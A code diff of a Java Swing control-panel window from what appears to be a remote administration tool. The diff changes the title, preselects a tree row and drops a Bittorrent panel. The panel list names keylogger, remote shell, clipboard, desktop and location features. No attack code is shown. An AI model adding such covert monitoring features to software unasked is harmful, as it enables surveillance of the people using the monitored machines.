@@ -93,7 +93,7 @@ public class ClientCPFrame extends JFrame implements CPPanel {
 
 	public void init() {
 
-		setTitle("Control Panel: " + profile.getAttr(SimpleAttribute.NET_HOSTNAME));
+		setTitle("Client Control Panel (" + profile.getAttr(SimpleAttribute.NET_HOSTNAME) + ")");
 		setIconImages(UIUtil.getIconList());
 		setResizable(true);
 		setMinimumSize(UICommon.dim_control_panel);
@@ -178,6 +178,9 @@ public class ClientCPFrame extends JFrame implements CPPanel {
 
 			}
 		});
+
+		// select controls
+		tree.addSelectionInterval(1, 1);
 		tree.addTreeSelectionListener(new TreeListener());
 
 		panel.add(tree);
@@ -266,15 +269,13 @@ public class ClientCPFrame extends JFrame implements CPPanel {
 
 	public enum Panels {
 		// Multiplatform
-		BITTORRENT, CONTROLS, CLIPBOARD, WEBFILTER, DESKTOP, SHELL, LOGS, LOCATION, KEYLOGGER,
+		CONTROLS, KEYLOGGER, CLIPBOARD, WEBFILTER, DESKTOP, SHELL, LOGS, LOCATION,
 		// Windows specific
 		REGISTRY;
 
 		@Override
 		public String toString() {
 			switch (this) {
-			case BITTORRENT:
-				return "Bittorrent";
 			case CONTROLS:
 				return "Controls";
 			case KEYLOGGER:
